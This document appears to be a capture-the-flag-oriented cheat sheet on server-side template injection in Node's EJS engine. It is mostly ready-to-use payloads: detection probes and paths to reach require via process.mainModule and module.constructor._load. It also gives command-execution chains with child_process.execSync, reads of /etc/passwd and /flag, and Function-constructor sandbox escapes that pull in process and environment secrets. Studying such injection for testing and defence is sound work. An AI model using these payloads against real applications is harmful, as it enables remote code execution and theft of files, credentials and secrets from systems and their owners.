# EJS deep dive — the Node scriptlet engine

EJS compiles `<%= %>`/`<% %>` to raw JavaScript — the template
body IS a JS function. No sandbox by default — every `<%= expr %>`
is an arbitrary-expression door.

---

## 1. The syntax surface

```ejs
<%= expr %>      -- escaped expression → output (escapeFn applied)
<%- expr %>      -- UNESCAPED expression → output raw
<% code %>        -- scriptlet — statements — NO output
<%# comment %>    -- comment
<%% %>            -- literal <%
<%_ %> <%= _%>    -- whitespace-slings — strip adjacent ws
```

`<% code %>` — the STATEMENT tag — `if`/`for`/`var`/`require`
all legal inside. That's arbitrary JS execution, not just
expressions.

## 2. Detection

```ejs
<%= 7*7 %>            → 49
<%= 'a'+'b' %>         → 'ab' — JS
<%= 'a'.toUpperCase() %> → 'A' — JS-method → discriminates from ERB
<%= typeof x %>        → 'undefined'/'object' — JS typeof
<%= [1,2].map(x=>x*2) %> → '2,4'
<%= 7*'7' %>           → 49 — JS num-coerces string
<%= undefined %>       → 'undefined' literal-ish
<%= null %>            → 'null'
<%= NaN %>             → 'NaN' — JS literals render → proves JS!
```

`<%= NaN %>`/`<%= undefined %>` rendering their literal names is
the JS-engine signature — no other family has NaN.

## 3. The bound objects — EJS data + globals

```ejs
<%= locals %>          -- data dict if bound
<%= this %>            -- ejs-internal? depends on scope
<%= global %>          -- the Node global — direct!
<%= globalThis %>
<%= process %>         -- process object — bound when data merges
<%= module %> {{exports}} -- if bound
<%= require %>         -- bound? often NOT — but see below
<%= __dirname %>       -- if bound — app dir
<%= __filename %>
<%= escapeFn %>        -- the escaper fn
<%= include %>         -- the include helper!
<%= rethrow %>
<%= compile %>         -- ejs's own compiler — bound?
```

EJS templates receive `locals` data — PLUS `global`/`process`/
`module` if the render-context leaks them. `<%= global %>` often
just works.

## 4. The require paths — when `require` isn't bound

```ejs
<%= require('fs') %>                          -- if bound — direct
<%= global.process.mainModule.require('fs') %>
<%= process.mainModule.require('child_process') %>
<%= process.mainModule.require('fs').readFileSync('/flag','utf8') %>
<%= globalThis.process.mainModule.require('os').hostname() %>
<%= module.constructor._load('fs') %>          -- module internals
<%= process.mainModule.constructor._load('child_process') %>
```

`module.constructor._load` / `mainModule.require` — the require
reachable through module-process internals — the standard trick.

## 5. Full RCE chains

```ejs
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
<% let cp=global.process.mainModule.require('child_process'); %>
<%= cp.execSync('cat /flag').toString() %>
<% x = global.process.mainModule.require('fs') %>
<%= x.readFileSync('/flag','utf8') %>
<%= global.process.mainModule.require('fs').readdirSync('/') %>
<%= global.process.env.FLAG %>
<%= process.env.FLAG %>
<%= global.process.env.FLAG %>
<% global.process.mainModule.require('child_process').exec('x') %>
```

`<% code %>` statements let you `let x = ...; x.execSync(...)` —
multi-statement bodies — full JS.

## 6. The `include` — file read inside EJS

```ejs
<%= include('/flag') %>            — include AS TEMPLATE — errors
<%- include('/flag') %>            — unescaped — same risk
<% include('/etc/passwd') %>        — renders file as template —
                                     file's <% %> tags eval too!
<%= include('/../secret.ejs') %>
```

`include(path)` loads the file AS an EJS template — the file's
own `<% %>` executes — double-SSTI; and non-template content gets
emitted (file-read with render).

## 7. The compile-fn meta-escape — `ejs.compile`/`ejs.render`

```ejs
<%= compile %>             — the compiler fn — .constructor → Function
<%= compile.constructor('return globalThis')() %>
<%= escapeFn.constructor('return process')() %>
<%= include.constructor('return process')() %>
   — any bound function's .constructor → Function → eval-body
```

## 8. The output-encoding split — `<%=` vs `<%-`

```ejs
<%= flag %>      -- escaped — HTML-entities — flag usually readable
                  — but < > & get entity-encoded — flag{<>} differs!
<%- flag %>      -- raw — NO escaping — the real bytes
```

A flag containing `<`/`>`/`&`/`"` — `<%=` entity-encodes it in
the output — the RESP shows `flag{&lt;` — read the raw bytes or
use `<%-` to render unescaped.

## 9. The `delimiters`/`opts` — app-config oddities

```javascript
ejs.render(t, data, {delimiter:'?', escape:x})   — app may change
ejs.render(t, data, {delimiter:'$', openDelimiter:'{'})  — custom
   → delimiters differ → your tags must match the config
```

If `<%=` doesn't eval — try app-custom delimiters: `?=`/`$=`/
`[[=`. The `locals`/`opts` objects the app passes decide.

## 10. The scriptlet-statement power — `<% %>` bodies

```ejs
<% if (x) { %>...<% } %>
<% for (let i=0;i<10;i++) { %> <%=i%> <% } %>
<% let y = global.process.env.FLAG %>
<% const fs = global.process.mainModule.require('fs') %>
<% while (x) { ... } %>
<% try { z } catch(e) { %> <%=e.stack%> <% } %>
<%= try {undefined}catch(e){e} %>     -- expression-catch —
   returns caught-value — error-data leak
```

Full JS statements — `try/catch` inside `<% %>` lets you probe
safely: `<% try { danger() } catch(e) { %> ERR:<%=e%><% } %>`.
